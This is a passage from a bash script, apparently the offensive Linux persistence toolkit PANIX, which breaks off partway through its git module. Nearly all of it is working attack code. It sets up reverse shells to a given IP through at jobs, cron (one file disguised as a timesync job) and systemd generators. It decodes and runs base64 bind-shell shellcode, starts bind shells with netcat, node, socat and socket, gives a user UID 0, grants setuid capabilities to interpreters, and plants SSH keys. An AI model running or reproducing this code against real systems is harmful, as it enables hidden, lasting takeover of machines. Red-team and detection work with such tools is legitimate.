#!/bin/bash
RED='\033[0;31m'
NC='\033[0m'

print_banner() {
	echo ""
	echo " __                      "
	echo "|__)  /\  |\\ | | \\_/   "
	echo "|    /~~\\ | \\| | / \\  "
	echo "                         "
	echo "@RFGroenewoud"
	echo ""
}

check_root() {
	if [[ $EUID -ne 0 ]]; then
		return 1
	else
		return 0
	fi
}

usage_user() {
	echo -e "${RED}[!] Warning: More features are available when running as root.${NC}"
	echo ""
	echo "Low Privileged User Options:"
	echo ""
	echo "  --at                  At job persistence"
	echo "  --authorized-keys     Add public key to authorized keys"
	echo "  --bind-shell          Execute backgrounded bind shell (supports multiple LOLBins)"
	echo "  --cron                Cron job persistence"
	echo "  --docker-container    Docker container with host escape (requires docker group permissions)"
	echo "  --git                 Git persistence"
	echo "  --reverse-shell       Reverse shell persistence (supports multiple LOLBins)"
	echo "  --shell-profile       Shell profile persistence"
	echo "  --ssh-key             SSH key persistence"
	echo "  --systemd             Systemd service persistence"
	echo "  --web-shell           Web shell persistence (PHP/Python)"
	echo "  --xdg                 XDG autostart persistence"
	echo "  --revert              Revert most changes made by PANIX' default options"
	echo "  --mitre-matrix        Display the MITRE ATT&CK Matrix for PANIX"
	echo "  --quiet (-q)          Quiet mode (no banner)"
}

usage_root() {
	echo ""
	echo "Root User Options:"
	echo ""
	echo "  --at                  At job persistence"
	echo "  --authorized-keys     Add public key to authorized keys"
	echo "  --backdoor-user       Create backdoor user"
	echo "  --bind-shell          Execute backgrounded bind shell (supports multiple LOLBins)"
	echo "  --cap                 Add capabilities persistence"
	echo "  --create-user         Create a new user"
	echo "  --cron                Cron job persistence"
	echo "  --docker-container    Docker container with host escape"
	echo "  --generator           Generator persistence"
	echo "  --git                 Git hook/pager persistence"
	echo "  --initd               SysV Init (init.d) persistence"
	echo "  --ld-preload          LD_PRELOAD backdoor persistence"
	echo "  --lkm                 Loadable Kernel Module (LKM) persistence"
	echo "  --malicious-package   Build and Install a package for persistence (DPKG/RPM)"
	echo "  --motd                Message Of The Day (MOTD) persistence (not available on RHEL derivatives)"
	echo "  --package-manager     Package Manager persistence (APT/YUM/DNF)"
	echo "  --pam                 Pluggable Authentication Module (PAM) persistence (backdoored PAM & pam_exec)"
	echo "  --passwd-user         Add user to /etc/passwd directly"
	echo "  --password-change     Change user password"
	echo "  --rc-local            Run Control (rc.local) persistence"
	echo "  --reverse-shell       Reverse shell persistence (supports multiple LOLBins)"
	echo "  --rootkit             Diamorphine (LKM) rootkit persistence"
	echo "  --shell-profile       Shell profile persistence"
	echo "  --ssh-key             SSH key persistence"
	echo "  --sudoers             Sudoers persistence"
	echo "  --suid                SUID persistence"
	echo "  --system-binary       System binary persistence"
	echo "  --systemd             Systemd service persistence"
	echo "  --udev                Udev (driver) persistence"
	echo "  --web-shell           Web shell persistence (PHP/Python)"
	echo "  --xdg                 XDG autostart persistence"
	echo "  --revert              Revert most changes made by PANIX' default options"
	echo "  --mitre-matrix        Display the MITRE ATT&CK Matrix for PANIX"
	echo "  --quiet (-q)          Quiet mode (no banner)"
	echo ""
}

# Module: setup_at.sh
setup_at() {
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""
	local time=""

	usage_at() {
		echo "Usage: ./panix.sh --at [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default at settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "  --time <time>                Specify time for at job (e.g., now + 1 minute)"
		echo "--custom                     Use custom at settings"
		echo "  --command <command>          Specify custom persistence command"
		echo "  --time <time>                Specify time for at job (e.g., now + 1 minute)"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--time )
				shift
				time=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --at --default --ip 10.10.10.10 --port 1337 --time \"now + 1 minute\""
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --at --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --time \"now + 1 minute\""
				exit 0
				;;
			--help|-h)
				usage_at
				exit 0
				;;
			* )
				echo "Invalid option for --at: $1"
				echo "Try './panix.sh --at --help' for more information."
				exit 1
		esac
		shift
	done

	if ! command -v at &> /dev/null; then
		echo "Error: 'at' binary is not present. Please install 'at' to use this mechanism."
		exit 1
	fi

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --at --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port || -z $time ]]; then
			echo "Error: --ip, --port, and --time must be specified when using --default."
			echo "Try './panix.sh --at --help' for more information."
			exit 1
		fi
		echo "/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" | at $time
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $time ]]; then
			echo "Error: --command and --time must be specified when using --custom."
			echo "Try './panix.sh --at --help' for more information."
			exit 1
		fi
		echo "$command" | at $time
	else
		echo "Error: Either --default or --custom must be specified for --at."
		echo "Try './panix.sh --at --help' for more information."
		exit 1
	fi

	echo "[+] At job persistence established!"
}

# Module: setup_authorized_keys.sh
setup_authorized_keys() {
	local key=""
	local path=""
	local default=0
	local custom=0

	usage_authorized_keys() {
		if check_root; then
			echo "Usage: ./panix.sh --authorized-keys [OPTIONS]"
			echo "Root User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default authorized keys settings"
			echo "  --key <key>                  Specify the public key"
			echo "--custom                     Use custom authorized keys settings"
			echo "  --key <key>                  Specify the public key"
			echo "  --path <path>                Specify custom authorized keys file path"
		else
			echo "Usage: ./panix.sh --authorized-keys [OPTIONS]"
			echo "Low Privileged User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default authorized keys settings"
			echo "  --key <key>                  Specify the public key"
		fi
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--key )
				shift
				key=$1
				;;
			--path )
				shift
				path=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --authorized-keys --default --key <public_key>"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --authorized-keys --custom --key <public_key> --path /home/user/.ssh/authorized_keys"
				exit 0
				;;
			--help|-h)
				usage_authorized_keys
				exit 0
				;;
			* )
				echo "Invalid option for --authorized-keys: $1"
				echo "Try './panix.sh --authorized-keys --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --authorized-keys --help' for more information."
		exit 1
	elif [[ -z $key ]]; then
		echo "Error: --key must be specified."
		echo "Try './panix.sh --authorized-keys --help' for more information."
		exit 1
	fi

	if check_root; then
		if [[ $default -eq 1 ]]; then
			path="/root/.ssh/authorized_keys"
		elif [[ $custom -eq 1 && -n $path ]]; then
			mkdir -p $(dirname $path)
		else
			echo "Error: --path must be specified with --custom for root."
			echo "Try './panix.sh --authorized-keys --help' for more information."
			exit 1
		fi
	else
		if [[ $default -eq 1 ]]; then
			local current_user=$(whoami)
			path="/home/$current_user/.ssh/authorized_keys"
		else
			echo "Error: Only root can use --custom for --authorized-keys."
			echo "Try './panix.sh --authorized-keys --help' for more information."
			exit 1
		fi
	fi

	mkdir -p $(dirname $path)
	echo $key >> $path
	chmod 600 $path

	echo "[+] Authorized_keys persistence established!"
}

# Module: setup_backdoor_user.sh
setup_backdoor_user() {
	local username=""

	usage_backdoor_user() {
		echo "Usage: ./panix.sh --backdoor-user [OPTIONS]"
		echo "--examples                 Display command examples"
		echo "--username <username>      Specify the username"
	}

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	while [[ "$1" != "" ]]; do
		case $1 in
			--username )
				shift
				username=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./panix.sh --backdoor-user --username <username>"
				exit 0
				;;
			--help|-h)
				usage_backdoor_user
				exit 0
				;;
			* )
				echo "Invalid option for --backdoor-user: $1"
				echo "Try './panix.sh --backdoor-user --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $username ]]; then
		echo "Error: --username must be specified."
		echo "Try './panix.sh --backdoor-user --help' for more information."
		exit 1
	fi

	usermod -u 0 -o $username

	if [[ $? -eq 0 ]]; then
		echo "[+] User $username has been modified to have UID 0 (root privileges)."
	else
		echo "[-] Failed to modify user $username."
		exit 1
	fi
	echo "[+] Backdoor user persistence established!"
}

# Module: setup_bind_shell.sh
setup_bind_shell() {
	local default=0
	local custom=0
	local shellcode=0
	local lolbin=0
	local architecture=""
	local binary=""
	local nc=0
	local node=0
	local socat=0
	local socket=0

	usage_bind_shell() {
		echo "Usage: ./panix.sh --bind-shell [OPTIONS]"
		echo "--examples                                Display command examples"
		echo "--default                                 Use default bind shell settings"
		echo "  --shellcode                               Use shellcode for bind shell"
		echo "    --architecture <arch>                     Specify architecture (x86 or x64)"
		echo "  --lolbin                                Use LOLBIN for bind shell"
		echo "    --nc | --node | --socat | --socket      Specify LOLBIN to use"
		echo "    --port <port>                             Specify port to bind shell to"
		echo "--custom                                  Use custom bind shell binary"
		echo "  --binary <binary>                         Specify the path to the custom binary"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--shellcode )
				shellcode=1
				;;
			--lolbin )
				lolbin=1
				;;
			--architecture )
				shift
				architecture=$1
				;;
			--binary )
				shift
				binary=$1
				;;
			--nc )
				nc=1
				;;
			--node )
				node=1
				;;
			--socat )
				socat=1
				;;
			--socket )
				socket=1
				;;
			--port )
				shift
				port=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --bind-shell --default --shellcode --architecture x86"
				echo "sudo ./panix.sh --bind-shell --default --lolbin --nc --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --bind-shell --custom --binary \"/tmp/bindshell\""
				exit 0
				;;
			--help|-h)
				usage_bind_shell
				exit 0
				;;
			* )
				echo "Invalid option for --bind-shell: $1"
				echo "Try './panix.sh --bind-shell --help' for more information."
				exit 1
		esac
		shift
	done

	# Validate argument combinations
	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --bind-shell --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ $shellcode -eq 0 && $lolbin -eq 0 ]]; then
			echo "Error: --default requires either --shellcode or --lolbin."
			echo "Try './panix.sh --bind-shell --help' for more information."
			exit 1
		fi

		if [[ $shellcode -eq 1 ]]; then
			if [[ -z $architecture ]]; then
				echo "Error: --architecture (x64/x86) must be specified when using --shellcode."
				echo "Try './panix.sh --bind-shell --help' for more information."
				exit 1
			fi

			case $architecture in
				x86 )
					echo "[+] Using shellcode for x86 architecture..."
					echo -n "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAiiAAAA8AAAAAcAAAAAEAAAMdv341NDU2oCieGwZs2AW15SaAIAIylqEFFQieFqZljNgIlBBLMEsGbNgEOwZs2Ak1lqP1jNgEl5+GgvL3NoaC9iaW6J41BTieGwC82A" | base64 -d > /tmp/bd86
					chmod +x /tmp/bd86
					/tmp/bd86 &
					echo "[+] Bind shell binary /tmp/bd86 created and executed in the background."
					;;
				x64 )
					echo "[+] Using shellcode for x64 architecture..."
					echo -n "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgAjKUiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=" | base64 -d > /tmp/bd64
					chmod +x /tmp/bd64
					/tmp/bd64 &
					echo "[+] Bind shell binary /tmp/bd64 created and executed in the background."
					;;
				* )
					echo "Error: Invalid architecture specified. Use one of x86 or x64."
					echo "Try './panix.sh --bind-shell --help' for more information."
					exit 1
			esac
			echo "[+] Bind shell persistence established!"
			echo "[+] The bind shell is listening on port 9001."
			echo "[+] To interact with it from a different system, use: nc -nv <IP> 9001"
		fi

		if [[ $lolbin -eq 1 ]]; then
			if [[ $nc -eq 0 && $node -eq 0 && $socat -eq 0 && $socket -eq 0 ]]; then
				echo "Error: --lolbin requires one of --nc, --node, --socat, or --socket."
				echo "Try './panix.sh --bind-shell --help' for more information."
				exit 1
			fi

			if [[ -z $port ]]; then
				echo "Error: --port must be specified when using --lolbin."
				echo "Try './panix.sh --bind-shell --help' for more information."
				exit 1
			fi

			# Ref: https://gtfobins.github.io/gtfobins/nc/#bind-shell
			if [[ $nc -eq 1 ]]; then
				echo "[+] Checking for Netcat (nc.traditional) on the system..."
				if command -v nc.traditional &>/dev/null; then
					echo "[+] Netcat (nc.traditional) is available. Starting bind shell on port $port..."
					nc.traditional -l -p "$port" -e /bin/sh &
					echo "[+] Netcat bind shell running in the background on port $port."
					echo "[+] To connect to the shell from the attacker box, use netcat or telnet:"
					echo "    nc <target.com> $port"
					echo "    telnet <target.com> $port"
				elif command -v nc &>/dev/null; then
					echo "[+] Checking if Netcat (nc) supports the -e option..."
					if nc -h 2>&1 | grep -q -- "-e"; then
						echo "[+] Netcat (nc) supports -e. Starting bind shell on port $port..."
						nc -l -p "$port" -e /bin/sh &
						echo "[+] Netcat bind shell running in the background on port $port."
						echo "[+] To connect to the shell from the attacker box, use netcat or telnet:"
						echo "    nc <target.com> $port"
						echo "    telnet <target.com> $port"
					else
						echo "[-] Netcat (nc) does not support the -e option. Cannot use Netcat for bind shell."
					fi
				else
					echo "[-] Neither nc.traditional nor nc with -e option is available. Cannot use Netcat for bind shell."
				fi
			fi

			# https://gtfobins.github.io/gtfobins/node/#bind-shell
			if [[ $node -eq 1 ]]; then
				echo "[+] Checking for Node.js on the system..."
				if command -v node &>/dev/null; then
					echo "[+] Node.js is available. Starting bind shell on port $port..."

					# Start the bind shell using Node.js
					node -e "
						const sh = require('child_process').spawn('/bin/sh');
						require('net').createServer(client => {
							client.pipe(sh.stdin);
							sh.stdout.pipe(client);
							sh.stderr.pipe(client);
						}).listen($port);
					" &

					if [[ $? -eq 0 ]]; then
						echo "[+] Node.js bind shell running in the background on port $port."
						echo "[+] To connect to the shell from the attacker box, use netcat or telnet:"
						echo "    nc <target.com> $port"
						echo "    telnet <target.com> $port"
					else
						echo "[-] Failed to start Node.js bind shell."
					fi
				else
					echo "[-] Node.js is not available on this system. Cannot use Node.js for bind shell."
				fi
			fi
			
			# Ref: https://gtfobins.github.io/gtfobins/socat/#bind-shell
			if [[ $socat -eq 1 ]]; then
				echo "[+] Checking for Socat on the system..."
				if command -v socat &>/dev/null; then
					echo "[+] Socat is available. Starting bind shell on port $port..."
					socat TCP-LISTEN:$port,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane &
					echo "[+] Socat bind shell running in the background on port $port."
					echo "[+] To connect to the shell from the attacker box, run:"
					echo "    socat FILE:\`tty\`,raw,echo=0 TCP:<target.com>:$port"
				else
					echo "[-] Socat is not available on this system. Cannot use Socat for bind shell."
				fi
			fi

			# Ref: https://gtfobins.github.io/gtfobins/socket/#bind-shell
			if [[ $socket -eq 1 ]]; then
				echo "[+] Checking for Socket on the system..."
				if command -v socket &>/dev/null; then
					echo "[+] Socket is available. Starting bind shell on port $port..."
					setsid nohup socket -svp '/bin/sh -i' $port &
					echo "[+] Socket bind shell running in the background on port $port."
					echo "[+] To connect to the shell from the attacker box, use netcat or telnet:"
					echo "    nc <target.com> $port"
					echo "    telnet <target.com> $port"
				else
					echo "[-] Socket is not available on this system. Cannot use Socket for bind shell."
				fi
			fi
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $binary ]]; then
			echo "Error: --binary must be specified when using --custom."
			echo "Try './panix.sh --bind-shell --help' for more information."
			exit 1
		fi

		if [[ ! -f $binary ]]; then
			echo "Error: Specified binary does not exist: $binary."
			echo "Try './panix.sh --bind-shell --help' for more information."
			exit 1
		fi

		chmod +x $binary
		$binary &
		echo "[+] Custom binary $binary is executed and running in the background."
		echo "[+] Bind shell persistence established!"
	else
		echo "Error: Either --default or --custom must be specified for --bind-shell."
		echo "Try './panix.sh --bind-shell --help' for more information."
		exit 1
	fi
}

# Module: setup_cap_backdoor.sh
setup_cap_backdoor() {
	local default=0
	local custom=0
	local capability=""
	local binary=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_cap_backdoor() {
		echo "Usage: ./panix.sh --cap [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default capabilities settings"
		echo "--custom                     Use custom capabilities settings"
		echo "  --capability <capability>   Specify the capability"
		echo "  --binary <binary>           Specify the path to the binary"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--capability )
				shift
				capability=$1
				;;
			--binary )
				shift
				binary=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --cap --default"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --cap --custom --capability \"cap_setuid+ep\" --binary \"/bin/find\""
				exit 0
				;;
			--help|-h)
				usage_cap_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --cap: $1"
				echo "Try './panix.sh --cap --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --cap --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --cap --help' for more information."
		exit 1
	fi

	# Ensure setcap is found
	if ! command -v setcap &>/dev/null; then
		if [[ -x /sbin/setcap ]]; then
			SETCAP="/sbin/setcap"
		else
			echo "[-] setcap not found. Ensure the 'libcap2-bin' package is installed."
			exit 1
		fi
	else
		SETCAP=$(command -v setcap)
	fi

	if [[ $default -eq 1 ]]; then
		local binaries=("perl" "ruby" "php" "python" "python3" "node")

		for bin in "${binaries[@]}"; do
			if command -v $bin &> /dev/null; then
				local path=$(command -v $bin)
				# Resolve symbolic links to get the real path
				path=$(realpath $path)
				$SETCAP cap_setuid+ep "$path"
				if [[ $? -eq 0 ]]; then
					echo "[+] Capability setuid granted to $path"
				else
					echo "[-] Failed to grant capability setuid to $path"
				fi
			else
				echo "[-] $bin is not present on the system."
			fi
		done
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $capability || -z $binary ]]; then
			echo "Error: --capability and --binary must be specified with --custom."
			echo "Try './panix.sh --cap --help' for more information."
			exit 1
		fi

		if command -v $binary &> /dev/null; then
			local path=$(command -v $binary)
			# Resolve symbolic links to get the real path
			path=$(realpath $path)
			$SETCAP $capability $path
			if [[ $? -eq 0 ]]; then
				echo "[+] Capability $capability granted to $path"
			else
				echo "[-] Failed to grant capability $capability to $path"
			fi
		else
			echo "[-] $binary is not present on the system."
		fi
	fi
	echo "[+] Capabilities backdoor persistence established!"
}

# Module: setup_create_new_user.sh
setup_create_new_user() {
	local username=""
	local password=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_create_user() {
		echo "Usage: ./panix.sh --create-user [OPTIONS]"
		echo "--examples                 Display command examples"
		echo "--username <username>      Specify the username"
		echo "--password <password>      Specify the password"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--username )
				shift
				username=$1
				;;
			--password )
				shift
				password=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./panix.sh --create-user --username <username> --password <password>"
				exit 0
				;;
			--help|-h)
				usage_create_user
				exit 0
				;;
			* )
				echo "Invalid option for --create-user: $1"
				echo "Try './panix.sh --create-user --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $username || -z $password ]]; then
		echo "Error: --username and --password must be specified."
		echo "Try './panix.sh --create-user --help' for more information."
		exit 1
	fi

	useradd -M $username
	echo "$username:$password" | chpasswd

	echo "[+] User persistence through the new $username user established!"
}

# Module: setup_cron.sh
setup_cron() {
	local cron_path=""
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""
	local name=""
	local option=""

	if ! command -v crontab &> /dev/null; then
		echo "Error: 'crontab' binary is not present. Please install 'cron' to use this mechanism."
		exit 1
	fi

	usage_cron() {
		if check_root; then
			echo "Usage: ./panix.sh --cron [OPTIONS]"
			echo "Root User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default cron settings"
			echo "  --ip <ip>                    Specify IP address"
			echo "  --port <port>                Specify port number"
			echo " --custom                     Use custom cron settings"
			echo "   --command <command>          Specify custom persistence command (no validation)"
			echo "   --name <name>                Specify custom cron job name"
			echo "   --crond                      Persist in cron.d directory"
			echo "   --crontab                    Persist in crontab file"
			echo "   --daily                      Persist in cron.daily directory"
			echo "   --hourly                     Persist in cron.hourly directory"
			echo "   --monthly                    Persist in cron.monthly directory"
			echo "   --weekly                     Persist in cron.weekly directory"
		else
			echo "Usage: ./panix.sh --cron [OPTIONS]"
			echo "Low Privileged User Options:"
			echo "--examples                   Display Cron persistence examples"
			echo "--default                    Use default systemd settings"
			echo "  --ip <ip>                    Specify IP address"
			echo "  --port <port>                Specify port number"
		fi
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--crond|--daily|--hourly|--monthly|--weekly )
				if check_root; then
					option=$1
					case $option in
						--crond )
							cron_path="/etc/cron.d"
							;;
						--daily )
							cron_path="/etc/cron.daily"
							;;
						--hourly )
							cron_path="/etc/cron.hourly"
							;;
						--monthly )
							cron_path="/etc/cron.monthly"
							;;
						--weekly )
							cron_path="/etc/cron.weekly"
							;;
					esac
				else
					echo "Error: Only root users can use the $option option."
					exit 1
				fi
				;;
			--crontab )
				if check_root; then
					cron_path="/etc/crontab"
				else
					echo "Error: Only root users can use the --crontab option."
					exit 1
				fi
				;;
			--name )
				shift
				name=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --cron --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "--daily|--hourly|--monthly|--weekly:"
				echo "sudo ./panix.sh --cron --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --daily --name \"evil_cron_job\""
				echo ""
				echo "--crond:"
				echo "sudo ./panix.sh --cron --custom --command \"* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --crond --name \"evil_cron_job\""
				echo ""
				echo "--crontab:"
				echo "sudo ./panix.sh --cron --custom --command \"* * * * * /bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --crontab"
				exit 0
				;;
			--help|-h)
				usage_cron
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './panix.sh --cron --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --default requires --ip and --port."
			echo "Try './panix.sh --cron --help' for more information."
			exit 1
		fi
		if check_root; then
			cron_path="/etc/cron.d/freedesktop_timesync1"
			command="* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'"
			echo "$command" > "$cron_path"

		else
			command="* * * * * /bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'"
			(crontab -l 2>/dev/null; echo "$command") | crontab -
		fi
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command ]]; then
			echo "Error: --custom requires --command."
			echo "Try './panix.sh --cron --help' for more information."
			exit 1
		fi
		if [[ $option == "--daily" || $option == "--hourly" || $option == "--monthly" || $option == "--weekly" ]]; then
			if [[ -z $name ]]; then
				echo "Error: --custom with --daily|--hourly|--monthly|--weekly requires --name."
				echo "Try './panix.sh --cron --help' for more information."
				exit 1
			fi
			echo -e "#!/bin/bash\n$command" > "$cron_path/$name"
			chmod +x "$cron_path/$name"
		elif [[ $option == "--crond" ]]; then
			if [[ -z $name ]]; then
				echo "Error: --custom with --crond requires --name."
				echo "Try './panix.sh --cron --help' for more information."
				exit 1
			fi
			echo "$command" > "$cron_path/$name"
		else
			echo "$command" | sudo crontab -
		fi
	else
		echo "Error: Either --default or --custom must be specified for --cron."
		echo "Try './panix.sh --cron --help' for more information."
		exit 1
	fi

	echo "[+] Cron persistence established."
}

# Module: setup_generator_persistence.sh
setup_generator_persistence() {
	local ip=""
	local port=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_generator() {
		echo "Usage: ./panix.sh --generator [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--ip <ip>                    Specify IP address"
		echo "--port <port>                Specify port number"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--examples )
				echo "Examples:"
				echo "./panix.sh --generator --ip 10.10.10.10 --port 1337"
				exit 0
				;;
			--help|-h)
				usage_generator
				exit 0
				;;
			* )
				echo "Invalid option for --generator: $1"
				echo "Try './panix.sh --generator --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $ip || -z $port ]]; then
		echo "Error: --ip and --port must be specified."
		echo "Try './panix.sh --generator --help' for more information."
		exit 1
	fi

	# Create the /usr/lib/systemd/system-generators/makecon file
	cat <<-EOF > /usr/lib/systemd/system-generators/makecon
	#!/bin/bash
	nohup bash -c "while :; do bash -i >& /dev/tcp/$ip/$port 0>&1; sleep 10; done" &
	EOF

	chmod +x /usr/lib/systemd/system-generators/makecon

	# Create the /usr/lib/systemd/system-generators/generator file
	cat <<-EOF > /usr/lib/systemd/system-generators/generator
	#!/bin/sh
	# Create a systemd service unit file in the late directory
	cat <<-EOL > "/run/systemd/system/generator.service"
	[Unit]
	Description=Generator Service

	[Service]
	ExecStart=/usr/lib/systemd/system-generators/makecon
	Restart=always
	RestartSec=10

	[Install]
	WantedBy=multi-user.target
	EOL

	mkdir -p /run/systemd/system/multi-user.target.wants/
	ln -s /run/systemd/system/generator.service /run/systemd/system/multi-user.target.wants/generator.service

	# Ensure the script exits successfully
	exit 0
	EOF

	chmod +x /usr/lib/systemd/system-generators/generator

	# Reload systemd and enable the generator service
	systemctl daemon-reload
	systemctl enable generator

	echo "[+] Systemd Generator persistence established!"
}

# Module: setup_git_persistence.sh
setup_git_persistence() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local hook=0
	local pager=0
	local path=""
	local command=""

	usage_git() {
		echo "Usage: ./panix.sh --git [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default bind shell settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "  --hook                       Establish Persistence through a Git Hook"
		echo "  --pager                      Establish Persistence through Git Pager"
		echo "--custom 				       Use custom Git settings"
		echo "  --command <command>          Specify custom persistence command"
		echo "  --path <path>                Specify custom path"
		echo "  --hook                       Establish Persistence through a Git Hook"
		echo "  --pager                      Establish Persistence through Git Pager"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--hook )
				hook=1
				;;
			--pager )
				pager=1
				;;
			--path )
				shift
				path=$1
				;;
			--command )
				shift
				command=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --git --default --ip 10.10.10.10 --port 1337 --hook|--pager"
				echo ""
				echo "--custom:"
				echo "./panix.sh --git --custom --command \"(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 &) &\" --path \"gitdir/.git/hooks/pre-commit\" --hook"
				echo ""
				echo "./panix.sh --git --custom --command \"nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > /dev/null 2>&1 & \${PAGER:-less}\" --path \"~/.gitconfig --pager\""
				exit 0
				;;
			--help|-h)
				usage_git
				exit 0
				;;
			* )
				echo "Invalid option for --git: $1"
				echo "Try './panix.sh --git --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: --default or --custom must be specified."
		echo "Try './panix.sh --git --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --git --help' for more information."
			exit 1
		fi

		if [[ $hook -eq 0 && $pager -eq 0 ]]; then
			echo "Error: Either --hook or --pager must be specified with --default."
			echo "Try './panix.sh --git --help' for more information."
			exit 1
		fi
	fi

	if [[ $custom -eq 1 ]]; then
		if [[ -z $path || -z $command ]]; then
			echo "Error: --path and --command must be specified when using --custom."
			echo "Try './panix.sh --git --help' for more information."
			exit 1
		fi

		if [[ $hook -eq 0 && $pager -eq 0 ]]; then
			echo "Error: Either --hook or --pager must be specified with --custom."
			echo "Try './panix.sh --git --help' for more information."
			exit 1
		fi
	fi

